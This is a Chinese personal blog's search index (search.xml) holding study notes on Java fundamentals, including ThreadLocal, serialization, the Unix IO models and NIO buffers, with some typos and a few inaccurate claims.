<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>java 基础知识点整理(一)</title>
    <url>//2020/03/04/%20java%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86(%E4%B8%80)/</url>
    <content><![CDATA[<h3 id="（1）JDK-JRE-JVM-的关系"><a href="#（1）JDK-JRE-JVM-的关系" class="headerlink" title="（1）JDK &amp; JRE &amp; JVM 的关系"></a>（1）JDK &amp; JRE &amp; JVM 的关系</h3><ol>
<li>JDK<br>JDK包含jre、java开发工具、java核心类库</li>
<li>JRE<br>jre是运行java程序的环境，包含java核心类库,和jvn的标准实现</li>
<li>JVM<br>是java虚拟机，实现java跨平台最核心的部分</li>
</ol>
<h3 id="（2）跨平台"><a href="#（2）跨平台" class="headerlink" title="（2）跨平台"></a>（2）跨平台</h3><p>因为jvm运行的是java编译后的字节码文件,因为jvm可以在多个平台安装,所以字节码文件就可以在多个平台的jvm上面运行.从而实现一次编译到处运行</p>
<h3 id="（3）基础数据类型"><a href="#（3）基础数据类型" class="headerlink" title="（3）基础数据类型"></a>（3）基础数据类型</h3><p>整型： byte、short、int、long<br>浮点型：double、float<br>逻辑型：boolean<br>字符型：char<br>长度<br>byte(1) 2的-7次方 到2的7次方-1<br>short(2) 2的-15次方 到 2的 15 次方-1<br>int(4)<br>long(8)<br>double(8)<br>float(4)<br>boolean(1&#x2F;8)<br>char(2)</p>
<h3 id="（4）自动装箱，自动拆箱"><a href="#（4）自动装箱，自动拆箱" class="headerlink" title="（4）自动装箱，自动拆箱"></a>（4）自动装箱，自动拆箱</h3><p>自动装箱：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Integer i= 100； // 基本类型自动装箱为包装类,编译器会优化为 Integer i = new Integer(100);</span><br></pre></td></tr></table></figure>

<p>自动拆箱</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int i =new Integer(100); //编译集会优化为 int i  =new Integer(100).intValue();</span><br></pre></td></tr></table></figure>

<h3 id="5-Integer-intValue"><a href="#5-Integer-intValue" class="headerlink" title="(5) Integer.intValue()"></a>(5) Integer.intValue()</h3><p>integer 定义的对象,范围在-128带127会被缓存起来，所以在这个范围内的integer进行判断相等会等于true，因为是同一对象</p>
<h3 id="6-和-equals-的区别"><a href="#6-和-equals-的区别" class="headerlink" title="(6) &#x3D;&#x3D; 和 equals 的区别"></a>(6) &#x3D;&#x3D; 和 equals 的区别</h3><p>1.&#x3D;&#x3D; 是判断对象地址是否相等，equals没在重写的情况下也是判读对象地址等同于&#x3D;&#x3D;<br>2.不通对象的地址是不一样的，如果相比较两个对象的内容是否一样则需重写equals方法</p>
<h3 id="7）hashcode-和-equals-的区别"><a href="#7）hashcode-和-equals-的区别" class="headerlink" title="(7）hashcode()和 equals()的区别"></a>(7）hashcode()和 equals()的区别</h3><p>equals()必须满足一下几点：<br>1.自反性 a.equals(a) &#x3D;true<br>2.对称性 a.equals(b) &#x3D;true b.equals(a) &#x3D;true<br>3.一致性 a.equals(a) 多次调用永远等于true<br>4.对于null判断始终等于false<br>hashcode()的实现方式和操作系统有关,姑且认为是获取对象的地址。<br>重写equals()方法必须重写hashcode(),因为在hash数据结构添加数据的时候，需要先通过hashcode()方法查找存储的位置(链地址发),如果该位置不存在则插入，如果该位置已经拥有对象则,需要通过equals()方法判断对象是否相同，如果相同则替换，如果不通则在改对象后面进行存储。<br>1.两个相同的对象hashcode 必须相同,hashcode相同的对象,对象之间可能不通<br>2. hashcode()不同,则对象也不相同</p>
<ul>
<li>如果之重写了equals()方法会出现什么效果？<br>答案：两个相同的对象hashcode不同,hashmap的key会放入相同的对象</li>
</ul>
<h3 id="8-String-StringBuffer-StringBuilder"><a href="#8-String-StringBuffer-StringBuilder" class="headerlink" title="(8) String &amp; StringBuffer &amp; StringBuilder"></a>(8) String &amp; StringBuffer &amp; StringBuilder</h3><ol>
<li>都是final的不可以被继承</li>
<li>String 不可变 StringBuffer,StringBuilder 长度可变</li>
<li>String 重写了equals()方法和hashcode()方法</li>
<li>StringBuffer 是线程安全的 StringBuilder是线程不安全的</li>
<li>在单线程下 StringBuffer和StringBuilder效率一样,再多线程下StringBuilder效率更高,因为StringBuffer在一些方法上加了同步synchronized 方式</li>
<li>字面直接声明的String 在编译期间都会优化为final声明的</li>
</ol>
<h3 id="9-‘-’-和substring"><a href="#9-‘-’-和substring" class="headerlink" title="(9) ‘+’ 和substring()"></a>(9) ‘+’ 和substring()</h3><ol>
<li>‘+’ 和 substring() 都会生成一个新的对象</li>
<li>‘+’ 和 substring() 都是在在堆中生成的对象 (<strong>没有在常量池所以不共享</strong>)</li>
<li>‘+’ 在编译期间会被优化为 append()方法</li>
</ol>
<h3 id="10-可以手动创建java-long-String-类么？可以使用么？为什么？"><a href="#10-可以手动创建java-long-String-类么？可以使用么？为什么？" class="headerlink" title="(10) 可以手动创建java.long.String 类么？可以使用么？为什么？"></a>(10) 可以手动创建java.long.String 类么？可以使用么？为什么？</h3><ol>
<li>可以创建，但是不能被使用，因为类加载机制(双亲委派机制)</li>
<li>因为自定义的类的加载器为AppClassLoader.AppClassLoader加载器加载的时候需要先加载其父加载器,ExtClassLoader加载器,ExtClassLoader会在 jre&#x2F;lib&#x2F;ext 下去寻找 java.long.String 类, 此时找不到该类，则会调用ExtClassLoader的父加载器BootStrap加载器,在jre&#x2F;lib下寻找,<br>最终找到String类并且加载</li>
<li>这也就是类加载的委托机制</li>
</ol>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>java 基础知识点整理(二)</title>
    <url>//2020/03/07/%20java%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86(%E4%BA%8C)/</url>
    <content><![CDATA[<h3 id="1-抽象类和接口"><a href="#1-抽象类和接口" class="headerlink" title="(1) 抽象类和接口"></a>(1) 抽象类和接口</h3><p>区别：</p>
<ol>
<li>抽象类可以有的方法可以有普通方法，接口的方法全都是抽象方法</li>
<li>抽象类可以用普通成员变量,接口中只有常量也就是，static final的</li>
<li>抽象类是单继承,接口可以多继承</li>
</ol>
<h3 id="2-面向对象的三大特性"><a href="#2-面向对象的三大特性" class="headerlink" title="(2) 面向对象的三大特性"></a>(2) 面向对象的三大特性</h3><ol>
<li><p>封装<br>将对象属性封装起来，只提供相关方法保障对象安全性,隐藏细节性。</p>
</li>
<li><p>继承<br>代码复用,增加扩展性</p>
</li>
<li><p>多态</p>
<pre><code>允许对象的不通子类对一个方法作出多种实现。
多态的三个条件，继承,子类重写夫类的方法,父类的引用只想子类的实现
</code></pre>
</li>
</ol>
<h3 id="3-重写和重载"><a href="#3-重写和重载" class="headerlink" title="(3) 重写和重载"></a>(3) 重写和重载</h3><ol>
<li>重写<br>子类重写夫类的方法,根据子类的类型调用具体的方法</li>
<li>重载<br>在同类下，方法名相同，参数数量不同</li>
</ol>
<h3 id="4-ThreadLocal-线程局部变量"><a href="#4-ThreadLocal-线程局部变量" class="headerlink" title="(4) ThreadLocal(线程局部变量)"></a>(4) ThreadLocal(线程局部变量)</h3><p>线程之间共享变量是有风险的,如果想每一个线程使用自己的变量可以使用ThreadLocal来实现<br>ThreadLocal 实际上是使用 ThreadLocalMap 来实现的 key 存储的是ThreadLocal,value为当前线程存储的变量<br>因为线程都有一个ThreadLocalMap 的属性。\</p>
<ol>
<li>set方法<br>(1) 获取当前线程<br>(2) 从当前线程获取ThreadLocalMap对象<br>(3) 把ThreadLoacl对象作为key value为要存储的值<br>(4) 如果获取当前线程ThreadLocalMap 为空 则创建ThreadLocalMap\</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> public void set(T value) &#123;</span><br><span class="line">    Thread t = Thread.currentThread();</span><br><span class="line">    ThreadLocalMap map = getMap(t);</span><br><span class="line">    if (map != null)</span><br><span class="line">        map.set(this, value);</span><br><span class="line">    else</span><br><span class="line">        createMap(t, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><br>2. get方法<br>(1) 获取当前线程<br>(2) 从当前线程获取ThreadLocalMap,将当前的ThreadLocal作为key 获取对应的value值</p>
<pre><code> public T get() {
    Thread t = Thread.currentThread();
    ThreadLocalMap map = getMap(t);
    if (map != null) {
        ThreadLocalMap.Entry e = map.getEntry(this);
        if (e != null) {
            @SuppressWarnings(&quot;unchecked&quot;)
            T result = (T)e.value;
            return result;
        }
    }
    return setInitialValue();
}
</code></pre>
<h3 id="5-ThreadLocalMap的key为什么是弱引用？"><a href="#5-ThreadLocalMap的key为什么是弱引用？" class="headerlink" title="(5) ThreadLocalMap的key为什么是弱引用？"></a>(5) ThreadLocalMap的key为什么是弱引用？</h3><p>如果不是弱引用则ThreadLocalMap无法释放内存\</p>
<ol>
<li>如果是普通的Map用来存储，theadlocal一直与线程保持强引用的关系\</li>
<li>会导致gc时如果线程不结束，则无法进行垃圾回收(gc 垃圾回收是可达性判断,强引用的关系是无法进行gc)的\</li>
<li>ThreadLocalMap 的key 为弱引用 继承了Weakreference来实现的\</li>
<li>ThreadLocalMap 为垃圾回收实现了便利</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//   ThreadLocalMap的key</span><br><span class="line"> static class Entry extends WeakReference&lt;ThreadLocal&lt;?&gt;&gt; &#123;</span><br><span class="line">     /** The value associated with this ThreadLocal. */</span><br><span class="line">          Object value;</span><br><span class="line">          Entry(ThreadLocal&lt;?&gt; k, Object v) &#123;</span><br><span class="line">              super(k);</span><br><span class="line">              value = v;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-ThreadLocal-内存泄漏"><a href="#6-ThreadLocal-内存泄漏" class="headerlink" title="(6) ThreadLocal 内存泄漏"></a>(6) ThreadLocal 内存泄漏</h3><p>只有调用ThreadLocal的get set remove方法才会采取措施来进行处理 ThreadLocal对应的value，<br>如果在局部定义ThreadLocal但是没有显示的调用remove方法怎会产生内存泄漏。<br>因为在 set或get方法的时候会将key为null的对象去除这样，对应的value没有gc root了,则会被gc回收<br>jdk建议将ThreadLocal定义为 static final的 这样 它的声明周期更长,由于一直都存在强引用，这样就能保证在任何时候都能获取到对应 Entry的value值，然后remove它，防止内存泄露。</p>
<h3 id="7-Comparable-和-Comparator的区别"><a href="#7-Comparable-和-Comparator的区别" class="headerlink" title="(7) Comparable 和 Comparator的区别"></a>(7) Comparable 和 Comparator的区别</h3><ol>
<li>Comparable 是接口 Coparator是类</li>
<li>需要排序的类都实现了Comparable 并且重写了 compare方法<br>this.&#x3D;&#x3D;obj 结果0<br>this.&gt; obj 结果正数<br>this.&lt; obj 结果负数</li>
<li>Comparator 可以传入到排序集合工具类的sort方法进行控制</li>
</ol>
<h3 id="8-继承"><a href="#8-继承" class="headerlink" title="(8) 继承"></a>(8) 继承</h3><ol>
<li>子类继承父类所有成员变量 (private 成员只有拥有权没有访问权)</li>
<li>子类可以直接使用父类的非private的成员隐式使用则在编译期间自动加上super关键字</li>
</ol>
<h3 id="9-fianl-相关"><a href="#9-fianl-相关" class="headerlink" title="(9) fianl 相关"></a>(9) fianl 相关</h3><ol>
<li>final 修饰类 ,类不能被继承 如String</li>
<li>final 修饰方法,方法不能被重写,重载</li>
<li>final 修饰属性,属性不可变 常量</li>
</ol>
<h3 id="10-try-cache-finaly-return"><a href="#10-try-cache-finaly-return" class="headerlink" title="(10) try{}cache{}finaly return"></a>(10) try{}cache{}finaly return</h3><ol>
<li>在 try {} 中return 会执行finaly的逻辑</li>
<li>在 try {} 中return 并且 finaly 也有retrun 返回的是try {} 中return 的值,retrun的时候是直接将retrun的值放到临时保存到局部变量中,等到finaly执行结束后会直接从该位置的值直接返回</li>
<li>无论执行return break continue 都会执行 finaly的内容，除非调System.exist()</li>
</ol>
<h3 id="11-switch字符串的实现"><a href="#11-switch字符串的实现" class="headerlink" title="(11) switch字符串的实现"></a>(11) switch字符串的实现</h3><p>switch的字符串的实现原理是int,在编译后switch的字符串会变为hashcode的值</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>java 基础知识点整理(三)</title>
    <url>//2020/03/11/%20java%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86(%E4%B8%89)/</url>
    <content><![CDATA[<h3 id="1-枚举的jdk实现"><a href="#1-枚举的jdk实现" class="headerlink" title="(1) 枚举的jdk实现"></a>(1) 枚举的jdk实现</h3><p>下面是枚举代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public enum Labels0 &#123;</span><br><span class="line"></span><br><span class="line"> ENVIRONMENT(&quot;环保&quot;), TRAFFIC(&quot;交通&quot;), PHONE(&quot;手机&quot;); private</span><br><span class="line"></span><br><span class="line"> String name;</span><br><span class="line"></span><br><span class="line"> private Labels0(String name) &#123; this.name = name;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">public String getName() &#123;</span><br><span class="line">    return name;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在编译后生成的字节码如下:\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/Xnip2020-03-08_21-47-37-d207e2f4043a439ead86e11865270cd3.jpg">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Xnip20200308_214737.jpg" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>可以看到枚举被编译后就是一个类，被编辑为final并且继承Enum<br>里面的枚举都是static finak的常量，静态的所以是单例的<br>重点：<br>++枚举类型没有可以访问的构造器，是真正的 final;是实例受控的，它们是单例的泛型化; 本质上是单元素的枚举;提供了编译时的类型安全。 单元素的枚举是实现单例的最佳方法!++</p>
<h3 id="2-jdk序列化"><a href="#2-jdk序列化" class="headerlink" title="(2) jdk序列化"></a>(2) jdk序列化</h3><p>定义：将实现Serializable接口的对象转成一个字节数组,并且可以讲字节数组转换为对象</p>
<ol>
<li>实现序列化</li>
</ol>
<ul>
<li>实现Serializable接口</li>
<li>该接口只是一个可序列化的标志并没包含实际的属性和方法</li>
<li>如果不在该方法中添加readObject 和 writeObject 则采取默认的序列化机制，如果添加了这两个方法还想执行默认的序列化机制 则需要分别调用 defaultReadObject()和defaultWriteObject()方法</li>
<li>为了保障安全性可以使用transient关键字修饰不必序列化的属性因为在序列化的过程中private的属性也会被序列化</li>
<li>实现ExternalSerializable接口 可以对要求序列化的内容进行控制，控制那些属性能被序列化，那些不能被序列化</li>
</ul>
<ol start="2">
<li>反序列化</li>
</ol>
<ul>
<li>实现Serializable接口接口反序列化,无需调用构造方法，完全处于字节</li>
<li>实现ExternalSerializable接口方法在反序列化的时候调用构造方法</li>
</ul>
<ol start="3">
<li>注意事项</li>
</ol>
<ul>
<li>被static 修饰的对象不会被序列化</li>
<li>对象的类名 属性都会被序列化，方法不会被序列化</li>
<li>保证序列化对象对象所在类的属性也是可以被序列化的</li>
</ul>
<ol start="4">
<li>ObjectOutputStream 是专门用来输出对象的输出流;<br>ObjectOutputStream 将 Java 对象写入 OutputStream。可以使用 ObjectInputStream 读取 (重构)对象。</li>
<li>serialVersionUID<br>用来判断序列化的版本号的，如果反序列化的时候如果版本号不一致则会抛异常</li>
</ol>
<h3 id="3-ERROR-和-Exception"><a href="#3-ERROR-和-Exception" class="headerlink" title="(3)ERROR 和 Exception"></a>(3)ERROR 和 Exception</h3><ol>
<li>error 是程序无法处理的错误，是有jvm虚拟机器抛出的异常如。outofmemorayerror,虚拟机将发生这种异常的线程直接终止</li>
<li>exception 是可以程序可以处理的异常，是程序主动抛出的异常。<br>异常氛围检查时异常和非检查异常，检查异常需要try cache 非检查异常无需try cache</li>
</ol>
<h3 id="4-常见的RuntimeException"><a href="#4-常见的RuntimeException" class="headerlink" title="(4)常见的RuntimeException"></a>(4)常见的RuntimeException</h3><ol>
<li>NullPointerExcepiton 空指针</li>
<li>IllegalArgumentExcepiton 参数无效</li>
<li>ArraysOutOfBoundsExcepiton 数组越界</li>
<li>ClassCaseException 类型转换异常</li>
<li>NumberFormatException 数字转换异常</li>
</ol>
<h3 id="5-泛型擦除"><a href="#5-泛型擦除" class="headerlink" title="(5)泛型擦除"></a>(5)泛型擦除</h3><p>编辑器生成的字节码是不包含泛型信息的,编译过程中会擦除泛型。限定类型会指向限定类型，非限定类型则指向object</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title>java IO相关(一) unix的五种模型</title>
    <url>//2020/03/19/%20java%20IO%E7%9B%B8%E5%85%B3(%E4%B8%80)%20unix%E7%9A%84%E4%BA%94%E7%A7%8D%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="Uinx-IO-模型"><a href="#Uinx-IO-模型" class="headerlink" title="Uinx IO 模型"></a>Uinx IO 模型</h2><p>unix 的io 模型分为以下5类</p>
<h3 id="阻塞io"><a href="#阻塞io" class="headerlink" title="阻塞io"></a>阻塞io</h3><p>当用户发起io请求后,等待数据,程序将数据从内核复制到程序缓冲区中,整个操作都是阻塞状态。\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/io1-1b12b48aee254809bd650ffc4638195c.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="阻塞io" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="非阻塞io"><a href="#非阻塞io" class="headerlink" title="非阻塞io"></a>非阻塞io</h3><p>当用户发起请求后,不等待数据,而是返回一个数据未准备完成的标志。<br>操作系统内核将准备要操作的数据,这个过程中程序会轮训的请求操作,直到操作系统将数据准备好。当程序轮训到系统内核响应数据准备好了之后,程序再将数据复制到程序自身的缓冲区\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/io2-a6ec6899ab26428aa95bb80299e05774.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="io2.png" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="io复用模型"><a href="#io复用模型" class="headerlink" title="io复用模型"></a>io复用模型</h3><p>我们常用select和poll函数使用了io复用模型。<br>当用户调用select函数的时候会阻塞,select函数会系统调用操作内核进行数据报的准备工作。当数据报准备完成后,程序直接复制数据包的内容到程序缓冲区中,io复用现在看来和阻塞io没有什么区别。但是当用户比较多的时候优势就展现出来了，假设有100个用户阻塞io会阻塞100个进程处理io.<br>如果是io复用模型,则用1个线程去管理这100个io请求。\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/io3-5be9c90b5af44e739cf8f0c744a1e72c.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="io3.png" />
<figcaption><strong>旧站配图 3 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/Xnip2020-03-14_00-36-30-a59ced60a0aa466691f3f2ef42442a4c.jpg">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Xnip20200314_003630.jpg" />
<figcaption><strong>旧站配图 4 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="信号驱动io"><a href="#信号驱动io" class="headerlink" title="信号驱动io"></a>信号驱动io</h3><p>我们可以使用信号.当用户发起io请求后,使程序接受操作系统的信号通知。<br>不等待数据。此时操作系统进行数据报的准备，当数据报准备完成之后会以信号的方式通知程序。程序收到数据准备完成的信号通知后，在将数据复制到程序缓冲区中。\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/io4-1502c54ca1fb46e7ac155f3db3620c78.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="io4.png" />
<figcaption><strong>旧站配图 5 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="异步io"><a href="#异步io" class="headerlink" title="异步io"></a>异步io</h3><p>当用户发起请求后不等待数据,操作系统内核直接将数据复制到程序的缓存区中，等到复制完成之后在通知程序操作成功。\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/io5-a35468fd1fe94b7a8d90b07ecaaa0ca9.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="io5.png" />
<figcaption><strong>旧站配图 6 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>前四种io模型都属于同步io，其中的第二阶段相同，都属于数据报准备完成后，操作系统内核将数据复制到程序的缓存区中。</p>
<ol>
<li>阻塞io则在数据准备和数据准备完成一直处于阻塞中</li>
<li>非阻塞io则是轮训的方式一直请求操作系统内核数据报是否准备完成</li>
<li>多路复用io则是发起io请求后,调用select。select单线程来判断那个io请求的数据报是否准备好。然后系统直接调用。</li>
<li>信号io则是 操作系统内核在数据报准备好的时候以信号的方式通知程序</li>
<li>异步io全程都是操作系统进行io处理，在处理io结束后通知程序</li>
<li>异步非异步的区别是io操作过程是否由操作系统处理。</li>
<li>阻塞非阻塞是io操作，操作系统是否返回一个标志告知io操作是否完成</li>
</ol>
<h3 id="相关博客"><a href="#相关博客" class="headerlink" title="相关博客"></a>相关博客</h3><p><a href="https://www.cnblogs.com/Lynn-Zhang/p/5711849.html" target="_blank" rel="noopener">Unix下 五种 I&#x2F;O模型</a></p>
<p><a href="https://blog.csdn.net/lihao21/article/details/51620374" target="_blank" rel="noopener">图解UNIX的I&#x2F;O模型</a></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>IO</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>java IO相关(二) BIO NIO AIO 介绍</title>
    <url>//2020/03/20/%20java%20IO%E7%9B%B8%E5%85%B3(%E4%BA%8C)%20BIO%20NIO%20AIO%20%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h3 id="BIO"><a href="#BIO" class="headerlink" title="BIO"></a>BIO</h3><p>bio 同步阻塞,每一个请求连接都由一个线程来处理</p>
<h3 id="NIO"><a href="#NIO" class="headerlink" title="NIO"></a>NIO</h3><p>nio 同步非阻塞,多路复用器轮询客户端的请求，每个客户端的 IO 请求会对应服务器的 一个线程</p>
<h3 id="AIO"><a href="#AIO" class="headerlink" title="AIO"></a>AIO</h3><p>aio 异步非阻塞,客户端的io请求都是由os来处理,os处理完成后再通知服务器启动线程处理 （需要操作系统支持）</p>
<ol>
<li>进程向操作系统请求数据</li>
<li>操作系统把外部数据加载到内核的缓冲区中</li>
<li>操作系统把内核的缓冲区拷贝到进程的缓冲区</li>
<li>进程获得数据完成自己的功能</li>
</ol>
<p>Java NIO 属于同步非阻塞 IO，即 IO 多路复用，单个线程可以支持多个 IO 即询问时从 IO 没有完毕时直接阻塞，变成了立即返回一个是否完成 IO 的信号。<br>异步 IO 就是指 AIO，AIO 需要操作系统支持。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>IO</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>java NIO 相关(一) NIO介绍</title>
    <url>//2020/03/25/java%20NIO%20%E7%9B%B8%E5%85%B3(%E4%B8%80)%20NIO%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h3 id="Java-NIO简介"><a href="#Java-NIO简介" class="headerlink" title="Java NIO简介"></a>Java NIO简介</h3><p>Java nio (new io) 是从java 1.4 版本开始引入有的一个新的IO API 可以替代标准的java io API.</p>
<p>NIO 和原来的io有同样的作用和目的,但是使用方式完全不通，NIO支持面向缓存区的基于通道的IO操作,NIO将以更加高效的方式进行文件的读写操作。</p>
<ul>
<li><p>Java.nio中拥有3个概念 selector channel 和 buffer 在java.nio中我们是面向块(blocl)或是缓冲区(buffer)编程的 buffer本事就是一个堆存区域地址是线上他就是一个数组，数据的读和写都是通过buffer来实现的</p>
</li>
<li><p>除了数组之外，buffer还提供了对于数据的结构化访问方式，并且可以追踪到系统的读写过程</p>
</li>
<li><p>java中的8种原生数据类型都有各自对应的buffer类型 如intbuffer longbuffer bytebuffer charbuffer boolean除外</p>
</li>
<li><p>Channel 指的是可以向其写入数据或是从中读取数据对象，它类似于 java中的stream</p>
</li>
<li><p>所有数据的读写都是通过buffer来进行的，永远不过出现直接向channel写入数据的情况，或是直接从channel读取数据的情况</p>
</li>
<li><p>与stream不同的是 channel是双向的 一个流只可能是inputstream 或是outputstream,channel打开后可以进行读取写入或是读写</p>
</li>
<li><p>由于channel是双向的因此他能更好的放映出操作系统的真实情况，在linux系统中底层操作系统的通道就是双向的</p>
</li>
</ul>
<h3 id="java-io-和-nio的区别"><a href="#java-io-和-nio的区别" class="headerlink" title="java io 和 nio的区别"></a>java io 和 nio的区别</h3><figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-9b532762da67441e9d0ede2df1f1df40.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>
]]></content>
      <categories>
        <category>NIO 系列</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>java NIO 相关(二) 缓冲区buffer的数据存取</title>
    <url>//2020/04/13/java%20NIO%E7%9B%B8%E5%85%B3(%E4%BA%8C)%20%E7%BC%93%E5%86%B2%E5%8C%BAbuffer%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%8F%96/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>java nio 是jdk1.4引入的,其中包含 selector,channel,buffer 其中buffer是用来提高效率的。nio中操作数据,都是直接操作buffer对象\</p>
<h3 id="buffer的类型"><a href="#buffer的类型" class="headerlink" title="buffer的类型"></a>buffer的类型</h3><ul>
<li>ByteBuffer</li>
<li>CharBuffer</li>
<li>ShortBuffer</li>
<li>IntBuffer</li>
<li>LongBuffer</li>
<li>FloatBuffer</li>
<li>DoubleBuffer</li>
</ul>
<p>java基本类型除了boolean外都有对应的buffer的对象，都是使用allocate()方法创建对应的buffer对象</p>
<h3 id="Buffer-的相关属性"><a href="#Buffer-的相关属性" class="headerlink" title="Buffer 的相关属性"></a>Buffer 的相关属性</h3><ul>
<li>capacity 容量<br>用来定义buffer的容量，在buffer初始化的时候设置,不可被修改</li>
<li>limit 界限</li>
<li>buffer的上限位置,limit &lt;&#x3D; capacity</li>
<li>pasition 位置</li>
<li>读写buffer的时候,下一个写或者读的位置 pasition小于 limit</li>
<li>mark 标记位置</li>
<li>使用mark()方法标记的位置,当调用reset()方法时,将pasition指向mark的位置</li>
</ul>
<h3 id="buffer-初始化"><a href="#buffer-初始化" class="headerlink" title="buffer 初始化"></a>buffer 初始化</h3><p>buffer 初始化调用 allocate()方法创建,下面看一下源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static ByteBuffer allocate(int capacity) &#123;</span><br><span class="line">       if (capacity &lt; 0)</span><br><span class="line">           throw new IllegalArgumentException();</span><br><span class="line">       return new HeapByteBuffer(capacity, capacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到 使用 new HeapByteBuffer(capacity, capacity); 在jvm堆中创建一个buffer对象</p>
